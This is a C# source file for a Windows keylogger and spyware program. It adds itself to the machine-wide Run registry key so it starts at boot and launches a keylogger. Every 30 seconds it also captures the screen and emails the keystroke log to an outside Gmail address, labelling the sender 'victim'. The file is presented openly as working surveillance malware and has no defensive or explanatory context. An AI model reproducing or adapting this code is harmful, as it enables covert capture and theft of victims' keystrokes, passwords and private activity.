using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace consolaCorreo
{
    
    class Program
    {


        private static void function_test2()
        {
            Keylogger.Init();

        }

        private static void function_test()
        {
            while (true)
            {

                System.Threading.Thread.Sleep(30000);
                Bitmap ScreenToBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                System.Drawing.Graphics.FromImage(ScreenToBitmap).CopyFromScreen(
                        new Point(0, 0),
                        new Point(0, 0),
                        new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
                ScreenToBitmap.Save(System.Windows.Forms.Application.StartupPath + "pantalla.jpg");
                GMail Cr = new GMail();
                MailMessage mnsj = new MailMessage();
                mnsj.Subject = "pruebaJorge";
                mnsj.To.Add(new MailAddress("uyarikuna@gmail.com"));
                mnsj.From = new MailAddress("victim@hipster.com", "Nueva");
                Attachment attach = new Attachment(System.Windows.Forms.Application.StartupPath + @"\log.txt");
                mnsj.Attachments.Add(attach);
                mnsj.Body = String.Format("keylog, timestamp: \n\n {0}", new DateTime().ToUniversalTime());
                Cr.MandarCorreo(mnsj);
                // Force a garbage collection to occur for this demo.
                GC.Collect();
            }
        }
        static void Main()
        {
            string path = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            RegistryKey key = Registry.LocalMachine.OpenSubKey(
                path, true);
            key.SetValue("MyApplication", Application.ExecutablePath.ToString());

            Task task = new Task(
               function_test); task.Start();
            Task task2 = new Task(function_test2); task2.Start();
            while (true) ;
               
            

           
           
           
            
            //while (true) ;
        }

        

            
    }
}
